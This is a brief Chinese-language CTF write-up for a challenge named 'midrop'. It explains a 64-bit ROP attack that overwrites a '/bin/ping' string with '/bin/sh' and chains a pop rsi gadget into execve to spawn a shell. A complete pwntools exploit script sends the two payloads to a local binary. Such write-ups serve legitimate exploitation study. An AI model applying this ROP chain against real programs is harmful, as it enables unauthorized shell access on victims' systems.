# midrop

rop是64位程序，execve()接受三个参数，path放在rdi，argv[]放在rsi，envp[]放在edx  

现在要使execve('/bin/sh', 0, 0)，  

payload1把原来的'/bin/ping'覆盖成'/bin/sh\0'（.data的写入处与'/bin/ping'相邻，且在原字符串的上面）  

payload2把\0弹到rsi作为第二参数，第三参数自然为0，无需操作。  

为避免影响rsi，把execve_addr设为函数的最后两个汇编指令。  

Exp:
```python
import pwn

pwn.context(arch='amd64', os='linux', log_level='debug')

p = pwn.process('./rop')
e = pwn.ELF('./rop')

execve_addr = pwn.p64(0x4006F6)     # lea mm_addr %edi ; call _execve

payload1 = b'A' * 16 + b'/bin/sh\x00'
p.sendlineafter(b'who are you?', payload1)

# ROPgadget --binary rop | grep 'pop'
pop_rsi_r15_addr = pwn.p64(0x400811)    # pop rsi ; pop r15 ; ret

payload2 = b'A' * 8 + b'B' * 8 + pop_rsi_r15_addr + pwn.p64(0) + pwn.p64(0) + execve_addr
p.sendlineafter(b'if you want to do?', payload2)

p.recv()
p.interactive()
```